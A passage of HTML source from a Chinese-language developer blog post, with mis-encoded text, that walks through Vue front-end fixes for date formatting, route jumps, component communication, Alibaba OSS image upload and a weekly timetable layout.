class="regexp">/(y+)/</span>.test(fmt))</span><br><span class="line">        fmt = fmt.replace(<span class="built_in">RegExp</span>.$1,(a.getFullYear() + <span class="string">&quot;&quot;</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$1.length));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(&quot;</span> + k + <span class="string">&quot;)&quot;</span>).test(fmt))</span><br><span class="line">            fmt = fmt.replace(<span class="built_in">RegExp</span>.$1,<span class="built_in">RegExp</span>.$1.length == <span class="number">1</span> ?o[k] :(<span class="string">&quot;00&quot;</span> + o[k]).substr((<span class="string">&quot;&quot;</span> + o[k]).length));</span><br><span class="line">    <span class="keyword">return</span> fmt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨vueæ–‡ä»¶ä¸­ä»…éœ€å¯¼å…¥åå†è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">filters: &#123;</span><br><span class="line">  <span class="function"><span class="title">dateFormat</span>(<span class="params">time</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>(time);</span><br><span class="line">    <span class="keyword">return</span> dateFormat(<span class="string">&quot;yyyy-MM-dd hh:mm&quot;</span>, date);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ï¼š<code>&#123;&#123; item.beginTime | dateFormat &#125;&#125;</code></p></li></ol><h2 id="äºŒã€è·¯ç”±è·³è½¬"><a href="#äºŒã€è·¯ç”±è·³è½¬" class="headerlink" title="äºŒã€è·¯ç”±è·³è½¬"></a>äºŒã€è·¯ç”±è·³è½¬</h2><p>éœ€è¦å®ç°çš„éœ€æ±‚ä¸ºï¼šç‚¹å‡»è¯¾ç¨‹é¡µé¢çš„æ’è¯¾æŒ‰é’®ï¼Œç„¶åè·³è½¬åˆ°â€œè¯¾è¡¨â€é¡µé¢</p><p><img src="https://i.loli.net/2021/07/17/FrHqd3M98c2JLCw.jpg" alt="Snipaste_2021-07-17_22-02-21.jpg"></p><p>ç„¶è€Œï¼Œç”±äºé¡¶ä¸Šçš„<code>menu-bar</code>ç”±componentså†™æ­»ï¼ˆå…·ä½“ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼‰ï¼Œæ— æ³•é€šè¿‡vue-routerç›´æ¥è·³è½¬åˆ°å¯¹åº”urlã€‚</p><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>ä¸ºæ’è¯¾æ·»åŠ äº‹ä»¶ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">arrangeSchedule</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.$router.push(&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/index/blank&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>è·³è½¬åˆ°ä¸€ä¸ªç©ºç™½é¡µé¢ï¼Œç„¶ååœ¨blanké¡µé¢ä¸­é€šè¿‡è·¯ç”±å¯¼èˆªè¿›è¡Œé¡µé¢è·³è½¬ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeRouteEnter</span>(<span class="params">to, <span class="keyword">from</span>, next</span>)</span> &#123;</span><br><span class="line">  next(<span class="function">(<span class="params">vm</span>) =&gt;</span> &#123;</span><br><span class="line">    vm.$router.replace(<span class="keyword">from</span>.path+<span class="string">&#x27;?page=by_schedule&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>å› ä¸ºblanké¡µé¢ä¸è¯¾è¡¨é¡µé¢å¯ä»¥å®ç°ç›¸äº’è·³è½¬ã€‚</p><h2 id="ä¸‰ã€çˆ¶å­ç»„ä»¶é€šä¿¡"><a href="#ä¸‰ã€çˆ¶å­ç»„ä»¶é€šä¿¡" class="headerlink" title="ä¸‰ã€çˆ¶å­ç»„ä»¶é€šä¿¡"></a>ä¸‰ã€çˆ¶å­ç»„ä»¶é€šä¿¡</h2><p>åœ¨å¯¹çˆ¶ç»„ä»¶å†…éƒ¨çš„å­ç»„ä»¶è¿›è¡Œä¿®æ”¹åï¼Œç‚¹å‡»ç¡®å®šéœ€è¦å®ç°</p><ul><li>å…³é—­å­ç»„ä»¶å¯¹è¯æ¡†</li><li>å¾—åˆ°å®æ—¶ä¿®æ”¹æ•°æ®å¹¶æ¸²æŸ“</li></ul><p>é€šè¿‡propså’Œ$emitå¯ä»¥å®ç°å…³é—­å¯¹è¯æ¡†çš„åŠŸèƒ½ï¼Œä½†æ˜¯è¦å¾—åˆ°æ•°æ®å¿…é¡»è°ƒç”¨çˆ¶ç»„ä»¶ä¸­çš„getListå‡½æ•°ã€‚æœ€å¼€å§‹çš„æƒ³æ³•æ˜¯é€šè¿‡å¼ºåˆ¶åˆ·æ–°çˆ¶ç»„ä»¶é¡µé¢å®ç°ï¼Œä½†æ˜¯è¿™æ ·ä¼šæœ‰è¾ƒé•¿æ—¶é—´ç™½å±ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</p><h2 id="è§£å†³æ–¹æ¡ˆ-1"><a href="#è§£å†³æ–¹æ¡ˆ-1" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>åŸæ¥å®Œå…¨å¯ä»¥é€šè¿‡åœ¨å­ç»„ä»¶å†…<code>this.$parent.getTeacherList();</code>ç›´æ¥è°ƒç”¨çˆ¶ç»„ä»¶çš„å‡½æ•°å®ç°ã€‚</p><h2 id="å››ã€å›¾ç‰‡çš„å­˜å‚¨ä¿®æ”¹"><a href="#å››ã€å›¾ç‰‡çš„å­˜å‚¨ä¿®æ”¹" class="headerlink" title="å››ã€å›¾ç‰‡çš„å­˜å‚¨ä¿®æ”¹"></a>å››ã€å›¾ç‰‡çš„å­˜å‚¨ä¿®æ”¹</h2><p>ä¸ºäº†å¯¹é™æ€èµ„æºè¿›è¡Œå‚¨å­˜å’Œä¿®æ”¹ï¼Œé‡‡ç”¨é˜¿é‡Œäº‘å¯¹è±¡å­˜å‚¨OSSã€‚</p><p>æ‰€æœ‰ä»£ç éƒ½æ”¾å…¥ä¸€ä¸ªjsæ–‡ä»¶ä¸­ï¼Œvueæ–‡ä»¶è‹¥éœ€è¦ä½¿ç”¨ossåˆ™å¯¼å…¥å°±è¡Œã€‚</p><h2 id="å®ç°æ–¹æ¡ˆ-1"><a href="#å®ç°æ–¹æ¡ˆ-1" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><p>src&gt;utils&gt;oss.js:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> OSS <span class="keyword">from</span> <span class="string">&quot;ali-oss&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ECommunityOss</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.client = <span class="keyword">new</span> OSS(&#123;</span><br><span class="line">            <span class="attr">region</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">            <span class="attr">accessKeyId</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">            <span class="attr">accessKeySecret</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">            <span class="attr">bucket</span>: <span class="string">&quot;xxx&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* file:æ–‡ä»¶  uniqueKey:å¯¹è±¡åç§°  progress:å›è°ƒå‡½æ•°  expires:è¿‡æœŸæ—¥æœŸ*/</span></span><br><span class="line">    <span class="function"><span class="title">asyncUpload</span>(<span class="params">file, uniqueKey, progress, expires</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.client.multipartUpload(uniqueKey, file, &#123;</span><br><span class="line">            progress,</span><br><span class="line">            <span class="attr">headers</span>: &#123;<span class="attr">Expires</span>: expires&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">getImgUrl</span>(<span class="params">uniqueKey</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.client.signatureUrl(uniqueKey);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">deleteImg</span>(<span class="params">uniqueKey</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.client.delete(uniqueKey);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">getPath</span>(<span class="params">fileName</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getImgUrl(fileName).split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> ECommunityOss;</span><br></pre></td></tr></table></figure><p>åœ¨vueæ–‡ä»¶ä¸­ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>å¤´åƒ:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;img-item&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;data.businessLicensePic&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;img-wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;data.businessLicensePic&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;å¤´åƒ&quot;</span> <span class="attr">title</span>=<span class="string">&quot;ç‚¹å‡»æŸ¥çœ‹æ”¾å¤§å›¾&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;delete-img&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;deleteImageInOss(data.businessLicensePic)&quot;</span>&gt;</span>åˆ é™¤å›¾ç‰‡<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;add-img&quot;</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;add-icon-wrapper&quot;</span> <span class="attr">title</span>=<span class="string">&quot;æ·»åŠ å›¾ç‰‡&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">        <span class="attr">type</span>=<span class="string">&quot;file&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;file-input&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">accept</span>=<span class="string">&quot;image/jpeg, image/png&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">change</span>=<span class="string">&quot;uploadImageToOss&quot;</span></span></span><br><span class="line"><span class="tag">      /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;img_label&quot;</span>&gt;</span>å»ºè®®å°ºå¯¸200*200px<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯¼å…¥</span></span><br><span class="line"><span class="keyword">import</span> ECommunityOss <span class="keyword">from</span> <span class="string">&quot;@/utils/ecommunity-oss&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»Ossåˆ é™¤</span></span><br><span class="line"><span class="function"><span class="title">deleteImageInOss</span>(<span class="params">imgUrl</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> urlSplits = imgUrl.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> eCommunityOss = <span class="keyword">new</span> ECommunityOss();</span><br><span class="line">  eCommunityOss.deleteImg(urlSplits[urlSplits.length - <span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">this</span>.data.businessLicensePic = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">//ä¸Šä¼ åˆ°oss</span></span><br><span class="line"><span class="function"><span class="title">uploadImageToOss</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> file = e.target.files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> self = <span class="built_in">this</span>;</span><br><span class="line">  <span class="keyword">const</span> eCommunityOss = <span class="keyword">new</span> ECommunityOss();</span><br><span class="line">  <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">const</span> uniqueKey = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime().toString();</span><br><span class="line">    <span class="keyword">const</span> progress = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">p</span>) </span>&#123;</span><br><span class="line">      self.uploadProgress =<span class="built_in">parseFloat</span>(p * <span class="number">100</span>).toFixed(<span class="number">2.</span>toString() + <span class="string">&quot;%&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    eCommunityOss.asyncUpload(file, uniqueKey, progress)</span><br><span class="line">      .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> imageUrl = eCommunityOss.getImgUrl(uniqueKey).split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (imageUrl) &#123;</span><br><span class="line">          self.data.businessLicensePic = imageUrl;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">    </span><br><span class="line"><span class="comment">//ç¬¬äºŒç§æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="title">uploadImage</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.ossUploadFile(e)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(res);</span><br><span class="line">      <span class="built_in">this</span>.data.businessLicensePic.push(res);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="title">ossUploadFile</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> file = e.target.files[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> fr = <span class="keyword">new</span> FileReader();</span><br><span class="line">    <span class="keyword">let</span> self = <span class="built_in">this</span>;</span><br><span class="line">    <span class="built_in">this</span>.warning = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/image/</span>.test(file.type)) &#123;</span><br><span class="line">      <span class="built_in">this</span>.warning = <span class="string">&quot;åªèƒ½ä¸Šä¼ åç¼€ä¸ºgif,ico,png,jpgçš„å›¾ç‰‡æ–‡ä»¶&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fr.readAsDataURL(file);</span><br><span class="line">    <span class="keyword">let</span> oss = <span class="keyword">new</span> Oss();</span><br><span class="line">    <span class="keyword">let</span> fileName = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime().toString(); <span class="comment">//!!!</span></span><br><span class="line">    oss</span><br><span class="line">      .asyncUpload(file, fileName, <span class="function">() =&gt;</span> &#123;&#125;)</span><br><span class="line">      .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        resolve(oss.getImgUrl(fileName).split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        reject(<span class="string">&quot;ä¸Šä¼ å¤±è´¥ï¼š&quot;</span> + err);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="title">deleteImage</span>(<span class="params">index</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.data.businessLicensePic.splice(index, <span class="number">1</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="äº”ã€ç¼–è¾‘æ—¶å›æ˜¾é¡ºåº"><a href="#äº”ã€ç¼–è¾‘æ—¶å›æ˜¾é¡ºåº" class="headerlink" title="äº”ã€ç¼–è¾‘æ—¶å›æ˜¾é¡ºåº"></a>äº”ã€ç¼–è¾‘æ—¶å›æ˜¾é¡ºåº</h2><p>æƒ³å®ç°ç‚¹å‡»ç¼–è¾‘æŒ‰é’®ï¼Œç„¶åå›æ˜¾è¯¾ç¨‹é¢œè‰²ã€‚ä½†æ˜¯å› ä¸ºæŸ¥è¯¢åˆ°è¯¾ç¨‹é¢œè‰²åï¼Œéœ€è¦ç­‰è·å–DOMåå†è®¾ç½®backgroundColorå®ç°ã€‚</p><p><img src="https://i.loli.net/2021/07/24/pE9cLukMAyJPsob.jpg" alt="Snipaste_2021-07-24_15-46-39.jpg"></p><h2 id="è§£å†³æ–¹æ¡ˆ-2"><a href="#è§£å†³æ–¹æ¡ˆ-2" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>é€šè¿‡ setInterval å¼‚æ­¥æ–¹æ³•ï¼Œæ¯è¿‡50msåˆ¤æ–­æœ‰æ²¡æœ‰è·å– dom èŠ‚ç‚¹ï¼Œè‹¥è·å–åˆ™é€šè¿‡ clearInterval æ–¹æ³•æ¸…é™¤ã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getClassDetail</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/lesson/queryLessonDetail&quot;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="attr">lessonId</span>: <span class="built_in">this</span>.classId,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.editClassForm = res.data.data;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.editClassForm.buildings.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.buildingIds.push(<span class="built_in">this</span>.editClassForm.buildings[i].buildingId);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">this</span>.data.classCoverPic = <span class="built_in">this</span>.editClassForm.coverImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.data.classDetailPic = <span class="built_in">this</span>.editClassForm.detailImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.data.classHeadPic = <span class="built_in">this</span>.editClassForm.headImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.data.classLogoPic = <span class="built_in">this</span>.editClassForm.iconImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.defaultTeacher = res.data.data.defaultTeacherId;</span><br><span class="line">      <span class="built_in">this</span>.defaultColor = res.data.data.colorNameId;</span><br><span class="line">      <span class="comment">// ä¸€ç›´åœ¨å¾®ä»»åŠ¡ä¸­å¾ªç¯ï¼Œç›´åˆ°è·å–åˆ° DOM å…ƒç´ </span></span><br><span class="line">      <span class="keyword">var</span> a = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = (<span class="built_in">document</span>.getElementById(<span class="string">&quot;rgb_span&quot;</span>).style.backgroundColor = <span class="string">&quot;#&quot;</span> + <span class="built_in">this</span>.</span><br><span class="line">        <span class="keyword">if</span> (obj) &#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="å…­ã€è¯¾è¡¨æ¨¡å—é¡µé¢å¸ƒå±€"><a href="#å…­ã€è¯¾è¡¨æ¨¡å—é¡µé¢å¸ƒå±€" class="headerlink" title="å…­ã€è¯¾è¡¨æ¨¡å—é¡µé¢å¸ƒå±€"></a>å…­ã€è¯¾è¡¨æ¨¡å—é¡µé¢å¸ƒå±€</h2><p>è¯´å®è¯è¿™ä¸€å—å¡äº†å¾ˆä¹…ï¼Œä¸çŸ¥é“å¦‚ä½•å¸ƒå±€æˆè¯¾è¡¨å½¢çŠ¶ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œæœ€åæ˜¯é€šè¿‡æ‹¿åˆ°æ•°æ®åçš„åŒé‡å¾ªç¯å®ç°çš„ã€‚</p><p><img src="https://i.loli.net/2021/07/24/nqATCVPdbpza5G3.png" alt="20210331124803519.png"></p><h2 id="å®ç°æ–¹æ¡ˆ-2"><a href="#å®ç°æ–¹æ¡ˆ-2" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><p>htmléƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š<img src="https://i.loli.net/2021/07/24/MfCd9bEpRkuZx8D.png" alt="20210331125103944.png"></p><p>é€šè¿‡ä¸ƒä¸ª classWeekList[i] i=0,1,â€¦,6 å®ç°ã€‚ååˆ†å†—ä½™ã€‚</p><p>æœ€ådataé‡Œçš„æ•°æ®ï¼š<img src="https://i.loli.net/2021/07/24/IxF8KomSqGidO1H.jpg" alt="Snipaste_2021-07-24_16-01-30.jpg"></p><p>classDaylist åˆ—è¡¨é‡Œçš„æ¯ä¸€ä¸ªå¯¹è±¡éœ€è¦åˆå§‹å€¼ id ï¼Œç„¶åè·å–æ—¶ä¾¿å¯èµ‹å€¼ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜éœ€å°†æ•°æ®æŒ‰ä¸Šå‘¨æ—¥åˆ°è¿™å‘¨å…­çš„é¡ºåºæ˜¾ç¤ºï¼Œåœ¨mountedä¸­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> nowData = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  <span class="built_in">this</span>.parentMsg.year=nowData.getFullYear();</span><br><span class="line">  nowData.setHours(<span class="number">0</span>); <span class="comment">//è®¾ç½®å°æ—¶</span></span><br><span class="line">  nowData.setMinutes(<span class="number">0</span>); <span class="comment">//è®¾ç½®åˆ†é’Ÿ</span></span><br><span class="line">  nowData.setSeconds(<span class="number">0</span>); <span class="comment">//è®¾ç½®ç§’</span></span><br><span class="line">  nowData.setMilliseconds(<span class="number">0</span>); <span class="comment">//è®¾ç½®æ¯«å¦™</span></span><br><span class="line">  <span class="comment">//è·å–ä»Šå¤©çš„æ˜¯å‘¨å‡ </span></span><br><span class="line">  <span class="keyword">let</span> currentDay = nowData.getDay();</span><br><span class="line">  <span class="comment">//æŠŠcurrentDay == 0èµ‹å€¼ç»™å‘¨æ—¥</span></span><br><span class="line">  <span class="keyword">if</span> (currentDay == <span class="number">0</span>) &#123;</span><br><span class="line">    currentDay = <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> sunDayTime = nowData.getTime() - currentDay * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> monDayTime = nowData.getTime() + (<span class="number">1</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> tueDayTime = nowData.getTime() + (<span class="number">2</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> wedDayTime = nowData.getTime() + (<span class="number">3</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> thuDayTime = nowData.getTime() + (<span class="number">4</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> friDayTime = nowData.getTime() + (<span class="number">5</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> satDayTime = nowData.getTime() + (<span class="number">6</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="built_in">this</span>.getMonthAndDay(</span><br><span class="line">    sunDayTime,</span><br><span class="line">    monDayTime,</span><br><span class="line">    tueDayTime,</span><br><span class="line">    wedDayTime,</span><br><span class="line">    thuDayTime,</span><br><span class="line">    friDayTime,</span><br><span class="line">    satDayTime</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">this</span>.getMultiClass();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å®šä¹‰ getMonthAndDay å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="title">getMonthAndDay</span>(<span class="params"> sunDayTime, monDayTime, tueDayTime, wedDayTime, thuDayTime, friDayTime, satDayTime </span>)</span> &#123;</span><br><span class="line">  <span class="comment">// è·å–ä¸Šå‘¨æ—¥çš„æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="built_in">this</span>.sunDayTime = sunDayTime;</span><br><span class="line">  <span class="built_in">this</span>.firstDay = <span class="keyword">new</span> <span class="built_in">Date</span>(sunDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.firstMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(sunDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// è·å–è¿™å‘¨ä¸€çš„æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="built_in">this</span>.monDayTime = monDayTime;</span><br><span class="line">  <span class="built_in">this</span>.secondDay = <span class="keyword">new</span> <span class="built_in">Date</span>(monDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.secondMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(monDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// è·å–è¿™å‘¨äºŒçš„æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="built_in">this</span>.tueDayTime = tueDayTime;</span><br><span class="line">  <span class="built_in">this</span>.thirdDay = <span class="keyword">new</span> <span class="built_in">Date</span>(tueDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.thirdMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(tueDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// è·å–è¿™å‘¨ä¸‰çš„æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="built_in">this</span>.wedDayTime = wedDayTime;</span><br><span class="line">  <span class="built_in">this</span>.fourthDay = <span class="keyword">new</span> <span class="built_in">Date</span>(wedDayTime).getDate();</span><br><span class="line">  <span 